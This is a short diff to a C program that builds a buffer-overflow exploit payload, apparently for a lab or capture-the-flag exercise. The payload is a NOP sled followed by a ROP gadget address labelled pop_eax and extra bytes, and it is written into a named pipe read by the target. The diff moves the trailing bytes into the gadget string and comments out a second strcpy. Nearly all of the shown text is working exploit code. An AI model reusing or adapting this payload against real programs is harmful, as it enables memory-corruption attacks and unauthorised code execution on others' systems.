@@ -9,13 +9,13 @@ int main(void)
 {
   char bufr[140];
   char trap[] = "\xe5\xb6\xa9\xbb";
-  char pop_eax[] = "\xe1\xa0\xb9\xbb";
+  char pop_eax[] = "\xe1\xa0\xb9\xbb\x01\x01\x01\x3b";
   int i;
   for(i = 0; i < 131; i++)
     memcpy(bufr + i, "\x90",1);
   
   strcpy(bufr + 131, pop_eax);
-  strcpy(bufr + 136, "\x01\x01\x01\x3b");
+  //strcpy(bufr + 136, "");
   writecmd(PIPEPATH, bufr);
   
   return 0;
